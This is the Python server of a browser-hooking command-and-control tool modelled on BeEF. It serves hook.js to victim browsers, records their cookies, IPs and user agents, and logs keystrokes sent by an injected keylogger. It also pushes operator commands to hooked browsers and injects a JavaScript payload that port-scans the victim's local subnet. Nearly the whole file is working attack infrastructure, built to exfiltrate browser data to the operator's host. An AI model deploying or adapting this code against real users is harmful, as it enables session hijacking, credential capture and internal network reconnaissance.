#coding=utf-8

import os.path
import sys
import json

import tornado.httpserver
import tornado.ioloop
import tornado.options
import tornado.web
from tornado.options import define, options

import random
import string
import configparser
import pymongo

import tornado.websocket

cmd = ''
cmd_id = ''

#  get acount information
def acount_info():
    config = configparser.ConfigParser()
    config.read('user.cfg')
    username = config['acount']['username']
    password = config['acount']['password']
    return username,password

def database_init():
    data_path = sys.path[0]+'/data'
    os.system('mongod --dbpath '+data_path+' >> '+data_path+'/db.log')

class Application(tornado.web.Application):
    def __init__(self):
        handlers=[(r'/', IndexHandler),
                (r'/shell', LoginPageHandler),
                (r'/hook.js',HookHandler),
                (r'/ws',EchoWebSocket),
#                (r'/hello',HelloHandler),
                (r'/cookie',SetCookieHandler),
                (r'/hook_tree',TreeHandler),
                (r'/poll',PollHandler),
                (r'/command',CommandHandler),
                (r'/log',LogHandler),
                (r'/scan',ScanHandler),
                ]

        setting={
        "template_path":os.path.join(os.path.dirname(__file__),"templates"),
        "static_path":os.path.join(os.path.dirname(__file__),"templates/static"),
        "cookie_secret":"61oETzKXQAGaYdkL5gEmGeJJFuYh7EQnp2XdTP1o/Vo=",
        }
        
#        database_init()
        tornado.web.Application.__init__(self,handlers,**setting)

define("port", default=8000, help="run on the given port", type=int)

#handlers 

class IndexHandler(tornado.web.RequestHandler):
    def get(self):
        self.render('index.html')

class HookHandler(tornado.web.RequestHandler):
    def get(self):
        if self.get_cookie("hook_id")==None:
            self.set_cookie("hook_id",self.genrandom())

        self.render('static/hook.js')

    def genrandom(self):
        cookie=''
        for i in range(32):
            cookie+=random.choice(string.uppercase+string.lowercase+"0123456789")
        return cookie

class LoginPageHandler(tornado.web.RequestHandler):
    def post(self):
        username = self.get_argument('username')
        password = self.get_argument('passwd')
        if not self.get_secure_cookie("su_cookie"):
            self.set_secure_cookie("su_cookie",username)
        else:    
            if username==acount_info()[0] and password==acount_info()[1]:
                self.render('shell.html')
            else:
                self.write("invaild username or password")
    def get(self):
        if self.get_secure_cookie('su_cookie')==acount_info()[0]:
            self.render('shell.html')


class EchoWebSocket(tornado.websocket.WebSocketHandler):
    def open(self):
        print "websocket open"
    
    def on_message(self,message):
        self.write_message("alert(1);")

    def on_close(self):
        print "websocket close"
    
    def check_origin(self,origin):
        return True

#for firefox cross orign cookie set bug 
class SetCookieHandler(tornado.web.RequestHandler):
    def get(self):
        self.redirect("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><circle r='100'></circle><foreignObject><html xmlns='http://www.w3.org/1999/xhtml'><meta http-equiv='Set-Cookie' content='ppp=aaa' /></html></foreignObject></svg>")


#return hook browser list with json 

class TreeHandler(tornado.web.RequestHandler):
    def get(self):
        self.set_header('Access-Control-Allow-Origin','*')
        self.set_header('Content-Type','application/json')
        client = pymongo.MongoClient("mongodb://localhost:27017")
        db = client.hookbrowser
        res={}
        i=0
        for doc in db.info.find():
            del doc["_id"]
            res.update({"hook"+str(i):doc})
            i+=1
        self.write(res)


class PollHandler(tornado.web.RequestHandler):
    def check_id_in(self,hook_id,db):
        for doc in db.info.find():
            if hook_id == doc["hook_id"]:
                return True        
        return False

    def save_db(self):
        header=dict(self.request.headers)
        ua=header["User-Agent"]
        hook_id = self.get_cookie("hook_id")
        IP = self.get_argument("IP")
#        cookies = self.get_argument("cookies")
        browser_version = self.get_argument("version")
        print "saving"
#&IP=192.168.1.144&cookies=su_cookie="2|1:0|10:1488543302|9:su_cookie|8:YmVlZg==|767ef2ac3ba3448e70e00c3350ddf9214cad7bf074e651d59e9cadd47ed8d922"; id=1000; star=9999&version=Firefox/45.0
        post_body=self.request.body
        f1=post_body.index("cookies=")
        f2=post_body.find("&",f1)
        cookies=post_body[f1:f2]
        

        client = pymongo.MongoClient("mongodb://localhost:27017")
        db = client.hookbrowser
        if self.check_id_in(hook_id,db):
            print "already in "
        else:
            db.info.insert({"ua":ua,"hook_id":hook_id,"IP":IP,"cookies":cookies,
                "browser_version":browser_version,"log":"","scan_result":"",

                })

    def post(self):
        header = dict(self.request.headers)
        origin = header["Origin"]
        self.set_header("Access-Control-Allow-Origin",origin)
        self.set_header("Access-Control-Allow-Credentials","true")

        hook_id = self.get_cookie("hook_id")
        print "hook_id"+hook_id
        
        global cmd 
        global cmd_id
        if cmd!='' and hook_id==cmd_id: 
            self.write(cmd)
            cmd = ''

        if hook_id:
            self.save_db()

class CommandHandler(tornado.web.RequestHandler):
    def post(self):
        global cmd
        global cmd_id
        cmd = self.get_argument('cmd')
        cmd_id = self.get_argument('cmd_id')

key_result=''

class LogHandler(tornado.web.RequestHandler):
    def post(self):
#cross domain handler - similar to poll  
        header = dict(self.request.headers)
        origin = header["Origin"]
        self.set_header("Access-Control-Allow-Origin",origin)
        self.set_header("Access-Control-Allow-Credentials","true")
        hook_id = self.get_cookie("hook_id")

        print hook_id

        global key_result
        key_map = {'1':'!','2':'@','3':'#','4':'$','5':'%','6':'^','7':'&','8':'*','9':'(','10':')',
        "-":"_","=":"+",",":"<",".":">","/":"?","[":"{","]":"}",
        }
        self.set_header('Access-Control-Allow-Origin','*')
        key_data = json.loads(self.request.body)
        print key_data
        for i in key_data:
            if i['modify']['shift']:
                try:
                    res = key_map[chr(i['code'])]
                    key_result+=res
                except Exception, e:
                    pass
            else:
                key_result+=chr(i['code'])

        print "get the key : "+key_result
#connect to databse and save the log

        client = pymongo.MongoClient("mongodb://localhost:27017")
        db = client.hookbrowser
        doc = db.info.find_one({"hook_id":hook_id})

        doc["log"] = doc["log"]+key_result
        db.info.save(doc)

        key_result = ''
        print "save key log in database"

class ScanHandler(tornado.web.RequestHandler):
    def post(self):
        scan_payload = """
        function ipcreate(ip){
    var ips = ip.replace(/(\d+\.\d+\.\d+)\.\d+/,"$1.");
    for(var i=1;i<=255;i++){
        CreateScript(ips+i,80);
        CreateScript(ips+i,22);
    }
}

function CreateScript(ip,xport){
    var s = document.createElement("script");
    s.setAttribute("onload","scan_find(\'"+ip+"\',\'"+xport+"\')");
    s.src="http://"+ip+":"+xport;
    document.body.appendChild(s);
}

ipcreate(target_ip);
        """
        
        global cmd
        global cmd_id
        try:
            scan_ip = self.get_argument('scan_ip')
        except Exception, e:
            pass

        var_dic = locals()
        if "scan_ip" in var_dic:
            cmd_id = self.get_argument("cmd_id")
            cmd = "var target_ip = '"+scan_ip+"';"+scan_payload
        else:
            scan_result = self.get_argument("ip")+":"+self.get_argument("port")
            print scan_result
#connect to database ,save the scan_result

            header = dict(self.request.headers)
            origin = header["Origin"]
            self.set_header("Access-Control-Allow-Origin",origin)
            self.set_header("Access-Control-Allow-Credentials","true")
            hook_id = self.get_cookie("hook_id")

            client = pymongo.MongoClient("mongodb://localhost:27017")
            db = client.hookbrowser
            doc = db.info.find_one({"hook_id":hook_id})

            res_database = doc["scan_result"].split(" ")
            if scan_result in res_database:
                pass
            else:
                doc["scan_result"] = doc["scan_result"]+" "+scan_result
                db.info.save(doc)

            scan_result = ''


import socket
import fcntl
import struct
import os   
import fileinput
import subprocess 
import re 

#current_path = os.path.abspath('.')
hook_path = "/root/pybeef/templates/static/hook.js"
current_path = os.path.abspath('.')
def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15])
    )[20:24])

def start_database():
#    data_msg = os.popen("mongod --dbpath "+current_path+"/data")
    cmd = "mongod --dbpath "+current_path+"/data & > /dev/null" 
    child = subprocess.Popen(args=cmd,shell=True)   
    print "start mongodb pid: "+str(child.pid)
    child.wait()

def config_hook(ip):
    for line in fileinput.input(hook_path,inplace=True):
        p = re.search(r"\d+\.\d+\.\d+\.\d+",line)
        if p:
            print line.replace(p.group(),ip),
        else:
            print line,
    fileinput.close()

def gen_hook():
    os.chdir("/root/pybeef/templates/static/")
    fp_hook = open('hook.js','w')
    fp_hook.truncate()
    for file_name in ['jquery-3.1.1.js','request.js','webrtc.js','pybeef.js',
    'browser_me.js','keylogger.js']:
        with open(file_name) as f:
            f_js = f.read()
        fp_hook.write(f_js)

def beef_init():
    ip = get_ip_address("eth0")
    print "get local ip address :"+ip
    
    print "start database..."
    start_database()
    print "generate hook.js"
    gen_hook()

    print "config hook.js"
    config_hook(ip)
    
    print "exit"

if __name__ == '__main__':
    beef_init()
    tornado.options.parse_command_line()
    http_server = tornado.httpserver.HTTPServer(Application())
    http_server.listen(options.port)
    
    print "Listening on localhost and port is "+str(options.port) 
    tornado.ioloop.IOLoop.instance().start()

